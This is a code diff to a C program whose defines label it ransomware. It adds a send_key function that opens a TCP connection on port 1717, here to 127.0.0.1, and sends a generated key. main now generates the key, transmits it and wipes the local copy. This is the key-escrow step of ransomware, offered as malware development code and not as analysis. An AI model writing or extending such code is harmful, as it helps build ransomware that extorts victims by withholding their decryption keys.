@@ -1,11 +1,56 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <time.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
 
+#define PORT 1717
 
 #define RANSOM_VERSION 1
 #define MAGIC_LEN 1000
 #define MAGIC_KEY 2
+
+int send_key(unsigned long key){
+    int sock = 0;
+    struct sockaddr_in serv_addr;
+
+    // Create socket file descriptor
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        perror("socket creation failed");
+        exit(EXIT_FAILURE);
+    }
+
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(PORT);
+
+    // Convert IPv4 and IPv6 addresses from text to binary form
+    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0) {
+        perror("Invalid address/ Address not supported");
+        exit(EXIT_FAILURE);
+    }
+
+    // Connect to the server
+    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+        perror("Connection Failed");
+        exit(EXIT_FAILURE);
+    }
+
+    // Convert unsigned long to a byte array
+    unsigned char buffer[sizeof(unsigned long)];
+    for (int i = 0; i < sizeof(unsigned long); ++i) {
+        buffer[i] = (key >> (i * 8)) & 0xFF;
+    }
+
+    // Send the byte array to the server
+    send(sock, buffer, sizeof(unsigned long), 0);
+    printf("Sent unsigned long value: %lu\n", key);
+
+    close(sock);
+}
 
 void print_char_bits(char c) {
     for (int i = 7; i >= 0; i--) {
@@ -71,13 +116,12 @@ unsigned long generate_key(){
 
 
 int main(void){
-    unsigned long key;
-    printf("key: ");
-    scanf("%lu", &key);
-    printf("key: %d\n", validation_key(key));
-    printf("key: %d\n", validation_key(generate_key()));
-    printf("key: %d\n", validation_key(generate_key()));
-    printf("key: %d\n", validation_key(generate_key()));
+    {
+        unsigned long key = generate_key();
+        send_key(key);
+
+        key ^= key;
+    }    
 
 
     return 0;
